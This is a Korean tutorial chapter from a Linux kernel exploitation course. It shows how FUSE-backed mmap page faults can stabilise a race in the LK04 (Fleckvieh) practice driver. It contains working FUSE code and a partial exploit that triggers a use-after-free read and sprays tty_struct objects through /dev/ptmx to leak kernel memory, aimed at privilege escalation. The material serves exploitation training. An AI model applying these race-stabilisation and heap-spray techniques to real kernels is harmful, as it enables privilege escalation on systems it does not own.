---
title: FUSE의 이용
tags:
    - [Linux]
    - [Kernel]
    - [Race Condition]
    - [Data Race]
    - [FUSE]
lang: kr
permalink: /kr/linux-kernel/LK04/fuse.html
pagination: true
bk: uffd.html
---
[앞 장](uffd.html)에서는 `userfaultfd`를 이용해 LK04(Fleckvieh)의 race를 안정화했습니다. 이번 장에서는 같은 LK04를 다른 방법으로 exploit해 봅니다.

## userfaultfd의 단점
앞 장에서 잠깐 설명했듯이, 현재 Linux에서는 일반 사용자가 `userfaultfd`를 자유롭게 쓸 수 없습니다. 정확히는, 사용자 공간에서 발생한 페이지 폴트는 감지할 수 있지만 커널 공간에서 발생한 페이지 폴트는 일반 사용자가 만든 `userfaultfd`로는 감지할 수 없습니다. 각각 다음 보안 완화 패치로 도입되었습니다.

- [userfaultfd: allow to forbid unprivileged users](https://lwn.net/Articles/782745/)
- [Control over userfaultfd kernel-fault handling](https://lwn.net/Articles/835373/)

그래서 이번에는 Linux 기능 중 하나인 **FUSE**를 사용합니다. 먼저 FUSE가 무엇인지부터 봅시다.

## FUSE란?
[**FUSE** (Filesystem in Userspace)](https://lwn.net/Articles/68104/)는 사용자 공간에서 가상 파일시스템을 구현할 수 있게 해 주는 Linux 기능입니다. 커널을 `CONFIG_FUSE_FS`와 함께 빌드하면 사용할 수 있습니다.
프로그램이 FUSE 파일시스템을 마운트하고, 누군가 그 안의 파일에 접근하면 프로그램 쪽에 정의한 핸들러가 호출됩니다. 구조적으로는 LK01에서 본 캐릭터 디바이스 구현과 매우 비슷합니다.[^1]

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="늑대" ></div>
  <p class="says">
    FUSE를 사용하는 애플리케이션으로는 <a href="https://github.com/libfuse/sshfs" target="_blank">sshfs</a>나 <a href="https://appimage.org/" target="_blank">AppImage</a>가 있어.
  </p>
</div>

## FUSE 사용하기
시스템에 설치된 FUSE 버전은 `fusermount` 명령으로 확인할 수 있습니다.
```
/ $ fusermount -V
fusermount version: 2.9.9
```
로컬 머신에서 FUSE를 시험해 보려면 다음 명령으로 설치하세요. 이번 대상 환경은 FUSE v2이므로 `fuse3`가 아니라 `fuse`를 씁니다.
```
# apt-get install fuse
```
FUSE 프로그램을 컴파일하려면 헤더도 필요합니다.
```
# apt-get install libfuse-dev
```

그럼 실제로 FUSE를 사용해 봅시다.
FUSE로 만든 파일시스템의 파일에 접근하면 `fuse_operations`에 정의한 핸들러가 호출됩니다. 여기에 `open`, `read`, `write`, `close` 같은 파일 연산, `readdir`, `mkdir` 같은 디렉터리 연산, 심지어 `chmod`, `ioctl`, `poll` 같은 것까지 구현할 수 있습니다. 우리는 exploit 목적으로만 사용할 것이므로 `open`과 `read`만 있으면 충분합니다. 파일을 열 수 있게 하려면 권한 등 메타데이터를 반환하는 `getattr`도 정의해야 합니다. 코드를 봅시다.
```c
#define FUSE_USE_VERSION 29
#include <errno.h>
#include <fuse.h>
#include <stdio.h>
#include <string.h>

static const char *content = "Hello, World!\n";

static int getattr_callback(const char *path, struct stat *stbuf) {
  puts("[+] getattr_callback");
  memset(stbuf, 0, sizeof(struct stat));

  /* 마운트 지점 기준 경로가 "/file"인지 확인 */
  if (strcmp(path, "/file") == 0) {
    stbuf->st_mode = S_IFREG | 0777; // 권한
    stbuf->st_nlink = 1; // 하드링크 수
    stbuf->st_size = strlen(content); // 파일 크기
    return 0;
  }

  return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi) {
  puts("[+] open_callback");
  return 0;
}

static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi) {
  puts("[+] read_callback");

  if (strcmp(path, "/file") == 0) {
    size_t len = strlen(content);
    if (offset >= len) return 0;

    /* 데이터 반환 */
    if ((size > len) || (offset + size > len)) {
      memcpy(buf, content + offset, len - offset);
      return len - offset;
    } else {
      memcpy(buf, content + offset, size);
      return size;
    }
  }

  return -ENOENT;
}

static struct fuse_operations fops = {
  .getattr = getattr_callback,
  .open = open_callback,
  .read = read_callback,
};

int main(int argc, char *argv[]) {
  return fuse_main(argc, argv, &fops, NULL);
}
```
다음처럼 `-D_FILE_OFFSET_BITS=64`를 붙여 컴파일합니다.
```
$ gcc test.c -o test -D_FILE_OFFSET_BITS=64 -lfuse
```
배포 환경 안에서는 정적 링크가 필요합니다. FUSE가 요구하는 라이브러리를 확인하면 `pthread`도 필요하다는 것을 알 수 있습니다.
```
$ pkg-config fuse --cflags --libs
-D_FILE_OFFSET_BITS=64 -I/usr/include/fuse -lfuse -pthread
```
이 옵션만으로 정적 링크를 하면 `dl` 관련 심볼이 없다고 나옵니다.
```
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_put_module.isra.0':
(.text+0xe0e): undefined reference to `dlclose'
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0x9e9e): undefined reference to `dlopen'
/usr/bin/ld: (.text+0x9efb): undefined reference to `dlsym'
/usr/bin/ld: (.text+0xa1e2): undefined reference to `dlerror'
/usr/bin/ld: (.text+0xa265): undefined reference to `dlclose'
/usr/bin/ld: (.text+0xa282): undefined reference to `dlerror'
collect2: error: ld returned 1 exit status
make: *** [Makefile:2: all] Error 1
```
링크 순서에 주의해서 맨 끝에 `-ldl`을 추가하면, GCC로 빌드한 FUSE 프로그램도 배포 환경에서 동작합니다.
```
$ gcc test.c -o test -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
```

`fuse_main`이 인자를 파싱하고 메인 루프를 실행합니다. 여기서는 `/tmp/test`에 마운트해 봅시다.
```
$ mkdir /tmp/test
$ ./test -f /tmp/test
```
정상이라면 에러 없이 프로그램이 멈춰 있는 상태가 됩니다. 에러가 나면 OS가 FUSE를 지원하는지, 컴파일할 때의 FUSE 버전이 환경과 맞는지 등을 확인하세요.
이 상태에서 다른 터미널에서 `/tmp/test/file`에 접근하면 데이터를 읽을 수 있어야 합니다.
```
$ cat /tmp/test/file
Hello, World!
```
이번에는 `readdir`를 구현하지 않았기 때문에 `ls` 같은 명령으로 파일 목록을 볼 수 없고, 루트 디렉터리 자체에 대한 `getattr`도 구현하지 않았기 때문에 `/tmp/test`의 존재가 이상하게 보일 수 있습니다.

또한 위 코드에서 사용한 `fuse_main`은 헬퍼 함수일 뿐입니다. 매번 인자를 주는 것이 싫다면, 다음처럼 더 하위 레벨 API를 직접 호출해도 됩니다.
```c
int main()
{
  struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
  struct fuse_chan *chan;
  struct fuse *fuse;

  if (!(chan = fuse_mount("/tmp/test", &args)))
    fatal("fuse_mount");

  if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
    fuse_unmount("/tmp/test", chan);
    fatal("fuse_new");
  }

  fuse_set_signal_handlers(fuse_get_session(fuse));
  setup_done = 1;
  fuse_loop_mt(fuse);

  fuse_unmount("/tmp/test", chan);

  return 0;
}
```
`fuse_mount`로 마운트 지점을 정하고, `fuse_new`로 FUSE 인스턴스를 만들고, `fuse_loop_mt`(`mt`는 멀티스레드)로 이벤트를 처리합니다. `fuse_set_signal_handlers`를 설정하지 않으면 루프를 깨끗하게 종료할 수 없어서 마운트 포인트가 망가질 수 있으니 잊지 마세요. 마지막 `fuse_unmount`에 도달하지 못하면 마운트 정리가 되지 않습니다.

## Race 안정화
이제 FUSE를 exploit 안정화에 활용하는 방법을 생각해 봅시다.
원리는 `userfaultfd`와 완전히 같습니다. `userfaultfd`에서는 페이지 폴트를 계기로 사용자 핸들러를 호출했지만, FUSE에서는 파일 `read`가 트리거입니다.
FUSE로 구현한 파일을 `MAP_POPULATE` 없이 `mmap`하면, 그 영역을 처음 읽거나 쓸 때 페이지 폴트가 발생하고, 결국 FUSE의 `read` 콜백이 실행됩니다. 이를 이용하면 `userfaultfd` 때와 마찬가지로 메모리 접근 타이밍에 컨텍스트를 바꿀 수 있습니다.

그 흐름은 아래와 같습니다.

<center>
  <img src="img/fuse_uafr.png" alt="FUSE를 통한 Use-after-Free" style="width:720px;">
</center>

`userfaultfd` 때와의 차이는, 페이지 폴트가 났을 때 FUSE 핸들러가 실행된다는 점뿐입니다. 이를 이용해 race를 안정화해 봅시다.
```c
cpu_set_t pwn_cpu;
char *buf;
int victim;

...

static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi) {
  static int fault_cnt = 0;
  printf("[+] read_callback\n");
  printf("    path  : %s\n", path);
  printf("    size  : 0x%lx\n", size);
  printf("    offset: 0x%lx\n", offset);

  if (strcmp(path, "/pwn") == 0) {
    switch (fault_cnt++) {
      case 0:
        puts("[+] UAF read");
        /* [1-2] `blob_get`에 의한 페이지 폴트 */
        // victim 해제
        del(victim);

        // tty_struct를 spray해서 victim 위치에 덮음
        int fds[0x10];
        for (int i = 0; i < 0x10; i++) {
          fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (fds[i] == -1) fatal("/dev/ptmx");
        }
        return size;
    }
  }

  return -ENOENT;
}

...

int setup_done = 0;

void *fuse_thread(void *_arg) {
  struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
  struct fuse_chan *chan;
  struct fuse *fuse;

  if (mkdir("/tmp/test", 0777))
    fatal("mkdir(\"/tmp/test\")");

  if (!(chan = fuse_mount("/tmp/test", &args)))
    fatal("fuse_mount");

  if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
    fuse_unmount("/tmp/test", chan);
    fatal("fuse_new");
  }

  /* 메인 스레드와 같은 CPU에서 동작 */
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  fuse_set_signal_handlers(fuse_get_session(fuse));
  setup_done = 1;
  fuse_loop_mt(fuse);

  fuse_unmount("/tmp/test", chan);
  return NULL;
}

int main(int argc, char **argv) {
  /* 메인 스레드와 FUSE 스레드가 항상 같은 CPU에서 실행되게 설정 */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  pthread_t th;
  pthread_create(&th, NULL, fuse_thread, NULL);
  while (!setup_done);

  /*
   * Exploit 본체
   */
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  /* FUSE 파일을 메모리에 매핑 */
  int pwn_fd = open("/tmp/test/pwn", O_RDWR);
  if (pwn_fd == -1) fatal("/tmp/test/pwn");
  void *page;
  page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE, pwn_fd, 0);
  if (page == MAP_FAILED) fatal("mmap");

  /* tty_struct와 같은 크기의 데이터 준비 */
  buf = (char*)malloc(0x400);
  victim = add(buf, 0x400);
  set(victim, "Hello", 6);

  /* [1-1] UAF Read: tty_struct 누출 */
  get(victim, page, 0x400);
  for (int i = 0; i < 0x80; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)(page + i));
  }

  return 0;
}
```
앞 장 코드와 비교하면 구조가 매우 비슷합니다. 이런 의미에서 FUSE는 경우에 따라 `userfaultfd`의 대체 수단이 될 수 있습니다. 코드를 실행해 보면 `tty_struct` 일부가 누출되는 것을 확인할 수 있습니다.

<center>
  <img src="img/fuse_uaf_read.png" alt="UAF Read" style="width:280px;">
</center>

`userfaultfd` 때와 마찬가지로, `copy_to_user`를 큰 크기로 호출했기 때문에 객체 앞부분은 누출되지 않습니다. 이 부분 역시 이전과 동일하게 더 작은 크기의 leak로 해결할 수 있습니다.

`userfaultfd`와 달리 주의해야 할 점은, FUSE에서는 첫 번째 페이지 폴트 때 매핑한 파일 크기만큼 한꺼번에 읽기 요청이 들어온다는 것입니다. `userfaultfd`는 페이지 단위(0x1000)로 폴트가 났으므로, 예를 들어 핸들러를 세 번 부르고 싶다면 0x3000만 `mmap`하면 됐습니다.
하지만 FUSE에서는 첫 폴트에서 0x3000바이트 요청이 한꺼번에 들어오므로, 이후에는 페이지 폴트가 더 발생하지 않습니다. 이 문제는 파일을 다시 열어서 쉽게 해결할 수 있습니다.

계속 파일을 열게 되므로, 다음처럼 함수로 빼 두는 것이 좋습니다.
```c
int pwn_fd = -1;
void* mmap_fuse_file(void) {
  if (pwn_fd != -1) close(pwn_fd);
  pwn_fd = open("/tmp/test/pwn", O_RDWR);
  if (pwn_fd == -1) fatal("/tmp/test/pwn");

  void *page;
  page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE, pwn_fd, 0);
  if (page == MAP_FAILED) fatal("mmap");
  return page;
}
```
그 이후는 기본적으로 `userfaultfd` 때와 같습니다. `userfaultfd`에서 `copy.src`를 설정하던 작업은, FUSE에서는 그냥 `memcpy`로 사용자 버퍼에 원하는 데이터를 복사해 두는 것으로 구현할 수 있습니다.
직접 exploit을 완성해 보세요.

<center>
  <img src="img/fuse_privesc.png" alt="FUSE를 통한 권한 상승" style="width:280px;">
</center>

샘플 exploit 코드는 [여기](exploit/fleckvieh_fuse.c)에서 다운로드할 수 있습니다.

[^1]: 사용자 공간에서 가상 캐릭터 디바이스를 등록하는 CUSE라는 메커니즘도 있습니다.
